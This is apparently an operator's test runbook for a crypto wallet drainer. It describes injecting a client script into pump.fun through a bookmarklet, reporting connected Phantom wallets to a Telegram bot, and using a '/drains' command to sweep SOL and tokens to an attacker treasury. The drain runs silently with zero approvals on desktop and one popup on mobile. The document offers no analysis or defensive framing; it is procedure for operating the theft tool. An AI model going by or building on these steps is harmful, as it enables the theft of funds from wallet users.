# Dust wallet runbook

0. Preflight
   - `BEACON_KEY` in `.env` matches `BKEY` in `client/x.js`
   - Node >= 18 on the server, HTTPS live on the domain
   - Treasury pubkey valid; open `x.min.js` in a text editor and confirm all five
     mint addresses survived minification

1. Treasury ATAs (once): create the associated token account for USDC, USDT,
   WSOL, JUP, mSOL on the treasury, e.g. send 1 unit of each from any wallet,
   or `spl-token create-associated-token-account` per mint.
   A missing ATA = that token is skipped at drain time (SOL still moves).

2. Make a dust wallet. Fund: 1 SOL, $20 USDC, $10 USDT.

3. Desktop: open Phantom as a LOCAL wallet (keys on the computer), import dust.

4. Open pump.fun, connect the wallet.

5. Click the patroller bookmark.

6. Expect within ~5s in Telegram:
   `🎯 wallet connected — phantom @ pump.fun · $... · 1 SOL + 20 USDC...`

7. Send `/drains`.
   Expect within ~10s: `💸 SILENT DRAIN — mode: secret (0 approvals)`.

8. Verify treasury balances and the tx on the explorer.

9. Mobile leg: repeat with Phantom mobile. Expect `mode: popup (1 approval)`.
   Keep the tab open while sending `/drains` — a suspended mobile tab won't
   poll.

10. Stale-state leg: detect a wallet, wait 4+ minutes, then `/drains`.
    Must still drain (blockhash/balance are re-read at build time).